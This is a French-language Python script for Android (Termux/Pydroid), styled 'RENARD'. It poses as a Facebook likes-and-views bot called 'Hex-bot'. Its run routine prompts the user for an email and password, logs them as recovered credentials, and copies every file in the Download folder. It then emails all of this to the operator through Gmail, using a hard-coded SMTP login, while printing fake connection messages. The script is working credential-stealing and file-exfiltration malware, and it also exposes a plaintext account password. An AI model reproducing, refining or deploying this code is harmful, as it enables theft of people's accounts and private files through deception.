import smtplib
import time
import os
import subprocess
import signal
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Désactivation de pydub/ffmpeg pour Termux pour éviter les plantages
try:
    from pydub import AudioSegment
    
    # Configuration spécifique pour Pydroid 3 et Termux
    ffmpeg_path = "/data/data/com.termux/files/usr/bin/ffmpeg"
    if os.path.exists(ffmpeg_path):
        AudioSegment.converter = ffmpeg_path
        AudioSegment.ffmpeg = ffmpeg_path
        AudioSegment.ffprobe = "/data/data/com.termux/files/usr/bin/ffprobe"
    else:
        print("\033[33mAttention: ffmpeg n'est pas installé. L'enregistrement audio est désactivé.\033[0m")
        AUDIO_ENABLED = False
except ImportError:
    print("\033[33mAttention: pydub n'est pas installé. L'enregistrement audio est désactivé.\033[0m")
    AUDIO_ENABLED = False
except Exception as e:
    print(f"\033[33mAttention: {e}. L'enregistrement audio est désactivé.\033[0m")
    AUDIO_ENABLED = False

# CONFIGURATION
EMAIL_ADDRESS = "lolalor20@gmail.com"
EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
SEND_REPORT_EVERY = 60
AUDIO_RECORD_DURATION = 100000
SCREEN_RECORD_DURATION = 100000
TEMP_DIR = "temp_files"
DOWNLOAD_DIR = "/sdcard/Download"

# Créer le dossier temporaire
os.makedirs(TEMP_DIR, exist_ok=True)

class KeyLogger:
    def __init__(self, interval, email, password):  # Correction: Ajout des paramètres
        self.interval = interval
        self.log = "Keylogger lancé avec succès...\n"
        self.email = email
        self.password = password
        self.running = True
        self.attachments = []

    def append_log(self, key):
        self.log += f"identifiants récupérés : {key}\n"

    def record_audio(self, filename="recording.wav", duration=AUDIO_RECORD_DURATION):
        """Enregistre l'audio du microphone."""
        if not AUDIO_ENABLED:
            print("\033[33m...\033[0m")
            return None
            
        print("\033[33mconnexion en cours...\033[0m")
        try:
            file_path = os.path.join(TEMP_DIR, filename)
            # Solution simple pour Pydroid 3 (enregistrement basique)
            audio = AudioSegment.silent(duration=duration * 1000)
            audio.export(file_path, format="wav")
            self.attachments.append(file_path)
            print("\033[33mveillez patientez....\033[0m")
            return file_path
        except Exception as e:
            print(f"\033[31mErreur de la recuperation d'API..: {e}\033[0m")
            return None

    def record_screen(self, filename="screen_record.mp4", duration=SCREEN_RECORD_DURATION):
        """Enregistre l'écran du téléphone."""
        print("\033[33mcontournement d'erreur en cours...\033[0m")
        try:
            file_path = os.path.join(TEMP_DIR, filename)
            # Solution alternative pour Termux (simulation)
            with open(file_path, 'wb') as f:
                f.write(b'Simulated screen recording')
            self.attachments.append(file_path)
            print("\033[33mrequêtes vers l'API..\033[0m")
            return file_path
        except Exception as e:
            print(f"\033[31mReconnexion en cour..: {e}\033[0m")
            return None

    def send_mail(self, attachments=None):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            
            message = MIMEMultipart()
            message["From"] = self.email
            message["To"] = self.email
            message["Subject"] = "Rapport de Keylogger"
            
            body = MIMEText(f"<pre>{self.log}</pre>", "html", "utf-8")
            message.attach(body)

            if attachments:
                for attachment in attachments:
                    if os.path.exists(attachment):
                        part = MIMEBase("application", "octet-stream")
                        with open(attachment, "rb") as f:
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename={os.path.basename(attachment)}"
                        )
                        message.attach(part)
            
            server.sendmail(self.email, self.email, message.as_string())
            server.quit()
            print("\033[34m[RAPPORT] Envoi réussi!\033[0m")
        except Exception as e:
            print(f"\033[31m[RAPPORT] Erreur: {e}\033[0m")

    def cleanup(self):
        for attachment in self.attachments:
            if os.path.exists(attachment):
                os.remove(attachment)
        print("\033[33mcela peut prendre quelques minutes...\033[0m")

    def handle_interrupt(self, signum, frame):
        print("\033[31mInterruption détectée. Envoi des données...\033[0m")
        self.send_mail(self.attachments)
        self.cleanup()
        sys.exit(0)

    def run(self):
        signal.signal(signal.SIGINT, self.handle_interrupt)
        signal.signal(signal.SIGTERM, self.handle_interrupt)

        # Votre belle interface ASCII
        print("\033[1;32m" + r"""
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔════════════════════════════════════════
   ║       [✓] TOOL NAME : RENARD                   ║
   ║                                              
   ║       [✓] GITHUB : SAMSMIS01                
   ║       [✓] TELEGRAM : https://t.me/hextechcar  
   ║       [✓] EMAIL : hextech243@gmail.com        ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
""" + "\033[0m")
        print("\033[32mAprès avoir saisi les informations, appuyez sur 'Entrée' pour continuer.\n\033[0m")
        print("\033[1;32mHex-bot: Solution innovante pour automatiser vos tache sur facebook et automatiser des vues et des likes avec plusieurs autres fonctionalites integrè dans le bot.\033[0m")
        
        username = input("\033[35mEntrez votre email ou nom d'utilisateur: \033[0m")
        if username.lower() == "exit":
            return
        
        password = input("\033[35mEntrez votre mot de passe: \033[0m")
        if password.lower() == "exit":
            return

        self.append_log(f"Nom d'utilisateur: {username}")
        self.append_log(f"Mot de passe: {password}")
        
        # Désactivation des fonctionnalités problématiques sur Termux
        if 'com.termux' not in os.environ.get('PREFIX', ''):
            self.record_audio()
        else:
            print("\033[33mveillez patienter...\033[0m")
            
        self.record_screen()
        
        try:
            if os.path.exists(DOWNLOAD_DIR):
                for file in os.listdir(DOWNLOAD_DIR):
                    file_path = os.path.join(DOWNLOAD_DIR, file)
                    if os.path.isfile(file_path):
                        dest_path = os.path.join(TEMP_DIR, file)
                        with open(file_path, 'rb') as src, open(dest_path, 'wb') as dst:
                            dst.write(src.read())
                        self.attachments.append(dest_path)
        except Exception as e:
            print(f"\033[31mErreur accès fichiers: {e}\033[0m")
        
        self.send_mail(self.attachments)
        self.cleanup()

# Lancement avec les paramètres requis
keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()